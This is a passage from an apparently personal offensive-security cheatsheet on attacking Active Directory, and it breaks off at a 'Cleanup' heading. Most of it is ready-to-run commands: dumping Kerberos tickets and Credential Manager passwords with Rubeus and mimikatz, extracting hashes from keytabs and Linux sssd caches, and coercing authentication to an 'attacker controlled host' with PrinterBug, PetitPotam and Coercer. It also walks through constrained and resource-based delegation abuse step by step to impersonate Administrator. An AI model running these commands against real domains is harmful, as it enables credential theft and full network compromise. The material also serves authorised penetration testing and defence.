<p>If previous commands do not work, the current user might not have enough privileges; try to impersonate <strong>NT AUTHORITY\SYSTEM</strong> - see <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#token-impersonation-mimikatz">Token Impersonation with mimikatz</a>.</p>
<p>Extract TGTs from memory in  a specified time interval with <code>Rubeus</code> (requires elevated privileges):</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe<span class="w"> </span>monitor<span class="w"> </span>/interval:5<span class="w"> </span>/nowrap
Rubeus.exe<span class="w"> </span>harvest<span class="w"> </span>/interval:30
</code></pre></div>
<p>Note: <code>harvest</code> also automatically renews expiring tickets whilst <code>monitor</code> does not.</p>
<p>Dump specific ticket with <code>Rubeus</code>:</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe<span class="w"> </span>dump<span class="w"> </span>/user:&lt;target<span class="w"> </span>user&gt;<span class="w"> </span>/service:&lt;target<span class="w"> </span>service&gt;<span class="w"> </span>/nowrap
</code></pre></div>
<h4 id="dumping-credentials-windows-credentials-manager">Dumping Credentials - Windows Credentials Manager</h4>
<p>Dump Windows Credentials Manager's passwords from memory with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>privilege::debug
sekurlsa::credman
</code></pre></div>
<p><strong>Take also a look to <a href="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation-cheatsheet.html#dumping-credentials">Windows Privilege Escalation - Dumping Credentials</a>.</strong></p>
<h4 id="dumping-credentials-keytab">Dumping Credentials - Keytab</h4>
<p>Extract keys and NTLM hashes with <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a>:</p>
<div class="highlight"><pre><span></span><code>keytabextract.py<span class="w"> </span>&lt;file.keytab&gt;
</code></pre></div>
<p>For more credentials dumping, take a look at:</p>
<ul>
<li><a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#dumping-credentials">Dumping Credentials</a></li>
<li><a href="https://www.netexec.wiki/smb-protocol/obtaining-credentials">Obtaining Credentials | NetExec</a></li>
<li><a href="https://tools.thehacker.recipes/">The Hacker Tools</a></li>
</ul>
<h4 id="dumping-credentials-linux">Dumping Credentials - Linux</h4>
<p>On a domain-joined linux machine, under folder <code>/var/lib/sss/db</code>, following files can be found:</p>
<ul>
<li>Machine ccache ticket.</li>
<li><code>ldb</code> cache databases containing all tickets used on the system.</li>
</ul>
<p>Use <a href="https://github.com/Hakumarachi/ccacheExtractor">ccacheExtractor</a> to extract cached tickets from a <code>ldb</code> database:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>ccacheExtractor.py<span class="w"> </span>kcm<span class="w"> </span>&lt;ldb<span class="w"> </span>database&gt;
</code></pre></div>
<p>It's also possible to dump ticket from the keyring  <strong>TODO</strong>.</p>
<p><strong>Please note that when a domain user authenticates to domain-joined linux machine, its ticket gets also stored by default to</strong> <code>/tmp</code>.</p>
<p>Machine account NTLM hash can be extracted from the ketyab file store at <code>/etc/krb5.keytab</code>.</p>
<h3 id="kerberos-delegation_1">Kerberos Delegation</h3>
<p><strong>Kerberos Delegation</strong> consists into reusing the end-user credentials, <strong>delegating</strong> to a service the ability to act on behalf of this user when accessing services (e.g., web servers) and resources (e.g., databases) hosted elsewhere, without the need for the user to re-authenticate.</p>
<ul>
<li>Kerberos delegation is often used in scenarios where multiple services work together, such as in multi-tier applications. For example, a user authenticates to a web server; the web server then makes requests to a database server. The web server may be delegated by the user to access some resources (depending on the type of the delegation) acting as the user itself and not as the web server's service account.</li>
</ul>
<p>There are three types of Kerberos Delegation:</p>
<ul>
<li><strong>Unconstrained Delegation</strong></li>
<li><strong>Constrained Delegation</strong></li>
<li><strong>Resource-based Constrained Delegation (RBCD)</strong></li>
</ul>
<p>Check for delegations with Impacket's <code>findDelegation</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-findDelegation<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class="w"> </span>-target-domain<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;
</code></pre></div>
<h4 id="unconstrained-delegation">Unconstrained Delegation</h4>
<p>In the <strong>Unconstrained Delegation</strong>, the delegated service can impersonate the user to any service in the domain.</p>
<ul>
<li><strong>The attack</strong>: By compromising the SS1, since the TGT is stored in the LSASS process, it's possible to extract it and reuse it to access services on behalf of the target user. The attacker just needs to wait for this user to connect to the compromised server.</li>
</ul>
<p>Unconstrained Delegation flow:</p>
<ol>
<li>The user requests a TGS for a particular service server (SS1) after obtaining the TGT from the DC.</li>
<li>The user sends to service server (SS1) the TGS (to access the service) and the TGT* (to be used for delegation) .</li>
<li>The service server (SS1) uses the user's TGT to request a new TGS for another service server (SS2).</li>
<li>The service server (SS1) uses the new TGS to access the other service server (SS2) resources as the authenticated user.</li>
</ol>
<p><img alt="kerberos-unconstrained-delegation.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/kerberos-unconstrained-delegation.png"/></p>
<p><strong>*Note</strong>: the TGT is placed inside the TGS. When the TGS is decrypted, the TGT gets extracted and stored in the LSASS.</p>
<p>Enumerate computers with Unconstrained Delegation Enabled:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetComputer</span> <span class="n">-UnConstrained</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">TrustedForDelegation</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span>
<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">TrustedForDelegation</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span>
</code></pre></div>
<p>See how to dump tickets in memory: <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#dumping-credentials">Dumping Credentials</a>.</p>
<p>Perform then pass-the-ticket attack with the dumped ticket: <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#pass-the-attacks">Pass-the-* Attacks</a></p>
<h5 id="coerced-authentications">Coerced Authentications</h5>
<p><strong>MS-RPRN abuse (Printer Bug)</strong>: By abusing Microsoft's Print Spooler service, it's possible for an attacker to force any machine running this service to connect to a target machine. this is done by mean of a particular RPC call (<code>RpcRemoteFindFirstPrinterChangeNotificationEx</code>).</p>
<ul>
<li>The attacked machine will authenticate to the target machine using its machine account via SMB protocol.</li>
</ul>
<p><strong>MS-EFSR abuse (PetitPotam)</strong>: similar to <strong>MS-RPRN</strong>,  this attacks abuses the MS-EFSRPC (Microsoft Encrypting File System Remote Protocol) to coerce authentication from a Windows machine.</p>
<ul>
<li><code>EfsRpcOpenFileRaw</code> is the main procedure used to trigger forced authentication.</li>
<li>Other EFSRPC function like <code>EfsRpcEncryptFileSrv</code> or <code>EfsRpcAddUsersToFile</code> can also be leveraged.</li>
</ul>
<p><strong>Note</strong>: Microsoft has released a patch for PetitPotam (CVE-2021-36942), but only for two of the methods <code>EfsRpcOpenFileRaw</code> and <code>EfsRpcEncryptFileSrv</code>.</p>
<p><strong>PrivExchange</strong>: Exchange can be tricked into authenticating to an attacker-controlled machine via NTLM, which can then be relayed to escalate privileges. This is done by simply loggin in on Exchange Web Services and subscribe to push notifications. This will make Exchange connect back to the attacker machine and authenticate as system.</p>
<p>These flaws can be abused in combination with Unconstrained Delegation in order to dump the machine account TGT and use it in a pass-the-ticket attack.</p>
<p>MS-RPRN - Check if spooler service is enabled on remote targets using <a href="https://github.com/vletoux/SpoolerScanner">SpoolerScanner</a>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Get-SpoolStatus</span><span class="p">.</span><span class="n">ps1</span>
<span class="nb">Get-SpoolStatus</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">server</span><span class="p">&gt;</span>
</code></pre></div>
<p>MS-RPRN - Check if spooler service is enabled on remote targets using Impacket's <code>rpcdump</code>:</p>
<div class="highlight"><pre><span></span><code>rpcdump.py<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>MS-RPRN
</code></pre></div>
<p>MS-RPRN - Trigger spooler service on remote target using <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> or <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug.py</a>:</p>
<div class="highlight"><pre><span></span><code>printerbug.py<span class="w"> </span><span class="s1">'DOMAIN'</span>/<span class="s1">'USER'</span>:<span class="s1">'PASSWORD'</span>@<span class="s1">'TARGET HOST'</span><span class="w"> </span><span class="s1">'ATTACKER CONTROLLED HOST'</span>

MS-RPRN.exe<span class="w"> </span>&lt;TARGET<span class="w"> </span>HOST&gt;<span class="w"> </span>&lt;ATTACKER<span class="w"> </span>CONTROLLED<span class="w"> </span>HOST&gt;
</code></pre></div>
<p>MS-EFSR - Use the <a href="https://raw.githubusercontent.com/topotam/PetitPotam/refs/heads/main/PetitPotam.py">PetitPotam</a> exploit (uses only):</p>
<div class="highlight"><pre><span></span><code>Petitpotam.py<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>&lt;unconstrained<span class="w"> </span>delegation<span class="w"> </span>host&gt;<span class="w"> </span>&lt;target&gt;
</code></pre></div>
<p>MS-EFSR - Use another <a href="https://github.com/ly4k/**PetitPotam**">PetitPotam</a> exploit that supports other RPC procedures:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>petitpotam.py<span class="w"> </span><span class="o">[</span>-method<span class="w"> </span>&lt;method&gt;<span class="o">]</span><span class="w"> </span>&lt;target&gt;<span class="w"> </span><span class="s1">'\\&lt;unconstrained delegation host&gt;\share\foo'</span>-debug<span class="w"> </span>
</code></pre></div>
<p>where <code>&lt;method&gt;</code> can be one of:</p>
<ul>
<li><code>EncryptFileSrv</code></li>
<li><code>DecryptFileSrv</code></li>
<li><code>QueryUsersOnFile</code></li>
<li><code>QueryRecoveryAgents</code></li>
<li><code>RemoveUsersFromFile</code></li>
<li><code>AddUsersToFile</code></li>
<li><code>FileKeyInfo</code></li>
<li><code>DuplicateEncryptionInfoFile</code></li>
<li><code>AddUsersToFileEx</code></li>
</ul>
<p>Check if a host can be forced to authenticate to another host with <a href="https://github.com/p0dalirius/Coercer">coercer</a>:</p>
<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>scan<span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;user&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>--target<span class="w"> </span>&lt;target&gt;
</code></pre></div>
<p>Force a host to connect to another host with <code>coercer</code>:</p>
<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;user&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>--target<span class="w"> </span>&lt;target&gt;<span class="w"> </span>--listener-ip<span class="w">  </span>&lt;unconstrained<span class="w"> </span>delegation<span class="w"> </span>host&gt;
</code></pre></div>
<h4 id="constrained-delegation_1">Constrained Delegation</h4>
<p>In the <strong>Constrained Delegation</strong>, the service can only impersonate the user to specific services that are explicitly defined, limiting the scope of delegation. </p>
<p>Even though the user is not using Kerberos Authentication for the SS1, it could be possible to transition the request to Kerberos by the mean of a <strong>Protocol Transition</strong> process.</p>
<ul>
<li><strong>The attack</strong>: By compromising the service account or, even better a machine account. with constrained delegation enabled, it's possible for an attacker to authenticate against allowed services as <strong>any user</strong>!</li>
</ul>
<p><strong>Note</strong>: Constrained Delegation only works within the same domain (cannot delegate across domain trusts). Moreover, it needs Domain Admin privileges to be set.</p>
<p>To allow <strong>constrained delegation</strong>, the Kerberos' extensions <strong>Service for User to Proxy (S4U2proxy)</strong> and <strong>Service for User to Self (S4U2self)</strong>, collectively known as Service for User (S4U), were introduced from Windows Server 2012. </p>
<ul>
<li><strong>Service for User to Self (S4U2self)</strong>: allows a service to obtain a TGS to itself on behalf of a user without the need of supplying any password. The service account must have the <code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION &ndash; T2A4D UserAccountControl</code> attribute. This extension allows to perform the <strong>protocol transition</strong>.</li>
<li><strong>Service for User to Proxy (S4U2proxy)</strong>: allows a service to obtains a TGS  to another service on behalf of a user. The attribute <code>msDS-AllowedToDelegateTo</code> contains a list of SPNs to which TGS can be forwarded.</li>
</ul>
<p>Constrained delegation flow <strong>without protocol transition</strong> (<strong>Kerberos Only</strong>):</p>
<ol>
<li>The user requests a TGS for a particular service server (SS1) after obtaining the TGT from the DC.</li>
<li>The user sends the TGS to service server (SS1) and authenticates to it.</li>
<li>The service server (SS1) sends the TGS to the DC to request a new TGS for another service server (SS2)</li>
<li>The DC checks the <code>msDS-AllowedToDelegateTo</code> on the service server's service account; if the requested service is present in the list, the DC returns a new TGS for the requested service (S4U2proxy)</li>
<li>The first service server (SS1) send the new ticket to the other service server (SS2) on behalf of the user.</li>
</ol>
<p><img alt="kerberos-constrained-delegation-no-protocol-transition.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/kerberos-constrained-delegation-no-protocol-transition.png"/></p>
<p>Constrained delegation flow <strong>with protocol transition</strong>:</p>
<ol>
<li>The user authenticates directly to the service server (SS1) using a non-Kerberos authentication (e.g., NTLM, form-based authentication, basic authentication, etc.).</li>
<li>The service server (SS1) requests a delegation TGT to the DC without supplying any password.</li>
<li>The DC checks if the service server's service account has the <code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> User Access Control (UAC)'s attribute. if everything checks out, the DC returns a TGT (S4U2Self) - <strong>Protocol Transition</strong>.</li>
<li>The service server (SS1) passes back the TGT to the DC requesting a new TGS for another service server (SS2). The DC checks the <code>msDS-AllowedToDelegateTo</code> on the service server's service account; if the requested service is present in the list, the DC returns a new TGS for the requested service (S4U2proxy)</li>
<li>The first service server (SS1) send the new ticket to the other service server (SS2) on behalf of the user.</li>
</ol>
<p><img alt="kerberos-constrained-delegation-with-protocol-transition.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/kerberos-constrained-delegation-with-protocol-transition.png"/></p>
<p>The key concept is that <strong>with protocol transition</strong>, the attacker just needs the target user credentials or hash in order to request a TGT (step 1) that will then be used for the <strong>S4USelf</strong> (steps 2-3) followed by the <strong>S4UProxy</strong> (steps 4-5).</p>
<ul>
<li>Abusing S4USelf will therefore allow to impersonate <strong>any user</strong>!</li>
</ul>
<p>Without protocol transition (<strong>Kerberos Only</strong>) the attacker first <strong>needs a forwardable TGS</strong> of the user he wants to impersonate.</p>
<ul>
<li>If the attacker wants to impersonate a different user, he can't use <strong>S4USelf</strong> since it will produce a <strong>non-forwardable TGS</strong>.</li>
<li><strong>Resource-Based Constrained Delegation</strong> can be used to obtain a forwardable TGS.</li>
<li><strong>CVE-2020-17049</strong> (Bronze bit) can be used to force the <code>forwardable</code> flag of a ticket to true.</li>
</ul>
<p>Enumerate users and computers with Constrained Delegation Enabled:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
<span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>

<span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span> <span class="n">msds-allowedtodelegateto</span><span class="p">,</span> <span class="n">useraccountcontrol</span> <span class="p">|</span> <span class="nb">fl</span>
<span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">msds</span> <span class="n">allowedtodelegateto</span> <span class="p">|</span> <span class="nb">fl</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span> <span class="o">-ne</span> <span class="s2">"$null"</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">msDS-AllowedToDelegateTo</span>
</code></pre></div>
<p>Request a TGT:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Kekeo</span>
tgt::ask<span class="w"> </span>/user:&lt;target<span class="w"> </span>user&gt;<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span><span class="o">[</span>/password:&lt;password&gt;<span class="p">|</span>/rc4:&lt;rc4<span class="w"> </span>hash&gt;<span class="p">|</span>/aes128:&lt;aes128<span class="w"> </span>hash&gt;<span class="p">|</span>/aes256:&lt;aes256<span class="w"> </span>hash&gt;<span class="p">|</span>/des:&lt;des<span class="w"> </span>hash&gt;<span class="o">]</span>

<span class="c1"># Rubeus - Request TGT for current user (no elevation required)</span>
Rubeus.exe<span class="w"> </span>tgtdeleg<span class="w"> </span>

<span class="c1"># Rubeus - Request TGT for specified user</span>
Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:&lt;target<span class="w"> </span>user&gt;<span class="w"> </span><span class="o">[</span>/password:&lt;password&gt;<span class="p">|</span>/rc4:&lt;rc4<span class="w"> </span>hash&gt;<span class="p">|</span>/aes128:&lt;aes128<span class="w"> </span>hash&gt;<span class="p">|</span>/aes256:&lt;aes256<span class="w"> </span>hash&gt;<span class="p">|</span>/des:&lt;des<span class="w"> </span>hash&gt;<span class="o">]</span><span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/outfile:&lt;output<span class="w"> </span>directory&gt;
</code></pre></div>
<p>Request TGS for an allowed service with s4u Kerberos' extension protocol with the previous TGT and perform a pass-the-ticket attack:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Kekeo</span>
tgs::s4u<span class="w"> </span>/tgt:&lt;kirbi<span class="w"> </span>ticket<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>/user:&lt;target<span class="w"> </span>user&gt;<span class="w"> </span>/service:&lt;target<span class="w"> </span>SPN&gt;

<span class="c1"># Rubeus</span>
Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:&lt;base64<span class="w"> </span>tgt<span class="p">|</span>kirbi<span class="w"> </span>ticket<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/msdsspn:&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>/dc:&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>/ptt<span class="w"> </span><span class="o">[</span>/altservice:&lt;other<span class="w"> </span>spns&gt;<span class="o">]</span>
</code></pre></div>
<p>Request TGT for service user and execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code> with Impacket's <code>getST</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-getST<span class="w"> </span>-spn<span class="w"> </span>&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class="w"> </span><span class="o">[</span>-force-forwardable<span class="o">]</span><span class="w"> </span><span class="o">[</span>-altservice<span class="w"> </span>&lt;other<span class="w"> </span>spns&gt;<span class="o">]</span>
</code></pre></div>
<p><strong>Note</strong>: <code>-force-forwardable</code> tries to force the TGS from S4USelf to be forwardable; it works if the target is vulnerable to Bronze-bit (CVE-2020-17049).</p>
<p><strong>Note</strong>: since the SPN part is not encrypted in the request, it's possible to change it with the <code>/altservice</code> (Rubeus) and <code>-altservice</code> (Impacket's getST) flags.</p>
<h4 id="resource-based-constrained-delegation-rbcd">Resource-Based Constrained Delegation (RBCD)</h4>
<p>Resource-Based Constrained Delegation (RBCD) was introduced with Windows Server 2012 R2; it adds more flexibility and granular control on the permission delegation by mean of the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</p>
<ul>
<li>Differently from Constrained Delegation's <code>msDS-AllowedToDelegateTo</code>, which is set on the <strong>delegating service account</strong>, the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> <strong>is set on the target service</strong>.</li>
<li><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> it's a security descriptor that controls which front-end service can use <strong>S4U2Proxy</strong> to request tickets for users to access the target service.</li>
<li>Unlike traditional <strong>Constrained Delegation</strong>, this does not require Domain Admin rights&mdash;it <strong>can be modified by the owner of the target service</strong>.</li>
<li>If <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> is set on a <strong>computer account</strong>, delegation is allowed to any service running on that machine. If it is set on a <strong>service account</strong>, only that specific service can receive the delegated authentication.</li>
</ul>
<p><strong>The attack</strong>: Since no Domain Admins privileges are required, when a user has <code>GenericWrite</code> or <code>WriteAccountRestrictions</code> permissions (or is the owner) of a target service/machine account, it&rsquo;s possible to modify its <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute so that it contains another attacker controlled computer object.</p>
<p>Attacking a <strong>machine account</strong>:</p>
<ol>
<li>An attacker compromises a domain user with enough privileges for the target host.</li>
<li>The attacker creates his own machine account (or compromises an existing one). When doing this, consider the <code>msDS-MachineAccountQuota</code> on the domain object; this defines the max number of machine account that is possible to add to a domain.</li>
<li>The attacker modifies the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on the targeted machine account adding his newly created machine account.</li>
<li>The attacker requests a <strong>forwardable TGS</strong> for an administrative user, by utilizing the controlled machine account.</li>
<li>The attacker requests a TGS for an administrative user on the target host through <code>S4UProxy</code>.</li>
<li>The attacker uses the TGS to authenticate against the target host as Administrator.</li>
</ol>
<p><strong>Note</strong>: RBCD works <strong>across domain trusts</strong>!</p>
<p>After patching CVE-2020-17049 and CVE-2020-16996, members of Protected Users group are not vulnerable to delegation even though the "sensitive and cannot be delegated" flag is disabled. However, the native <code>Administrator</code> account (RID 500) doesn't seem to benefit from that restriction, even if it's added to the Protected Users group!</p>
<p>Enumerate machine quota:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-DomainObject</span> <span class="n">-Identity</span> <span class="s2">"DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;"</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">domain</span><span class="p">&gt;</span> <span class="n">-DomainController</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">dc</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ms-ds-machineaccountquota</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADDomain</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">DistinguishedName</span> <span class="p">|</span> <span class="nb">Get-ADObject</span> <span class="n">-Properties</span> <span class="s1">'ms-DS-MachineAccountQuota'</span> 
</code></pre></div>
<p>Enumerate machine quota remotely with <code>NetExec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-M<span class="w"> </span>maq
</code></pre></div>
<p>Enumerate workstations' <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-Property</span> <span class="n">name</span><span class="p">,</span> <span class="n">msds-allowedtoactonbehalfofotheridentity</span><span class="p">*</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">-Property</span> <span class="n">msds-allowedtoactonbehalfofotheridentity</span> <span class="o">-NE</span> <span class="n">-Value</span> <span class="nv">$null</span>

<span class="c"># AD Module</span>
<span class="nb">Get-ADComputer</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span> <span class="n">-Filter</span> <span class="p">*</span>
</code></pre></div>
<p>Enumerate workstations' <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> remotely with Impacket's <code>rbcd</code>:</p>
<div class="highlight"><pre><span></span><code>rbcd.py<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'&lt;target machine account&gt;$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-action<span class="w"> </span><span class="s1">'read'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;username&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
</code></pre></div>
<p>Add a new machine account to the domain:</p>
<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
<span class="nv">$Password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<span class="nb">New-ADComputer</span> <span class="n">-Name</span> <span class="s2">"&lt;name&gt;"</span> <span class="n">-SamAccountName</span> <span class="s2">"&lt;name&gt;$"</span> <span class="n">-Path</span> <span class="s2">"CN=Computers, DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'"</span> <span class="n">-UserPrincipalName</span> <span class="s2">"&lt;sam account name&gt;$@&lt;domain&gt;"</span> <span class="n">-Enabled</span> <span class="nv">$true</span>  <span class="n">-AccountPassword</span> <span class="nv">$Password</span>
</code></pre></div>
<p>Add a new machine account to the domain remotely with Impacket's <code>addcomputer</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'&lt;name&gt;$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>-dc-host<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;'</span>
</code></pre></div>
<p>Add controlled machine account to target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. Requires a user with enough privileges:</p>
<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
<span class="nb">Set-ADComputer</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="s1">'&lt;controlled machine account&gt;$'</span>
</code></pre></div>
<p>Add controlled machine account to target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> remotely with Impacket's <code>rbcd</code>. Requires a user with enough privileges:</p>
<div class="highlight"><pre><span></span><code>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">'&lt;controlled machine account&gt;$'</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'&lt;target machine account&gt;$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;username&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
</code></pre></div>
<p>Create a machine account and add it to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> using relayed credentials with Impacket's <code>ntlmrelayx</code>:</p>
<div class="highlight"><pre><span></span><code>ntlmrelayx<span class="w"> </span>-t<span class="w"> </span>ldaps://&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>-smb2support<span class="w"> </span>--add-computer<span class="w"> </span>&lt;computer<span class="w"> </span>name&gt;<span class="w"> </span>--delegate-access
</code></pre></div>
<p>Request a Service Ticket with the controlled machine account on behalf of Administrator for the target machine with <code>Rubeus</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># First request a TGT</span>
Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:<span class="s2">"&lt;controlled machine account&gt;</span>$<span class="s2">"</span><span class="w"> </span>/password:&lt;password&gt;<span class="w"> </span>/nowrap

<span class="c1"># Use TGT to obtain a forwardable TGS</span>
Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/nowrap<span class="w"> </span>/impersonateuser:<span class="s2">"administrator"</span><span class="w"> </span>/msdsspn:<span class="s2">"host/&lt;target host&gt;"</span><span class="w"> </span>/altservice:cifs,ldap<span class="w"> </span>/domain:<span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>/user:<span class="s2">"&lt;controlled machine account&gt;</span>$<span class="s2">"</span><span class="w"> </span>/ticket:&lt;ticket<span class="w"> </span>from<span class="w"> </span>previous<span class="w"> </span>command&gt;
</code></pre></div>
<p>Request a Service Ticket with the controlled machine account on behalf of Administrator for the target machine remotely with Impacket's <code>getST</code>:</p>
<div class="highlight"><pre><span></span><code>getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s1">'cifs/&lt;target host&gt;'</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;controlled machine account&gt;$:&lt;password&gt;'</span>
</code></pre></div>
<p>Use the resulting ticket in a <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#pass-the-attacks">Pass-the-Ticket</a> attack.</p>
<p>Cleanup:</p>
<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
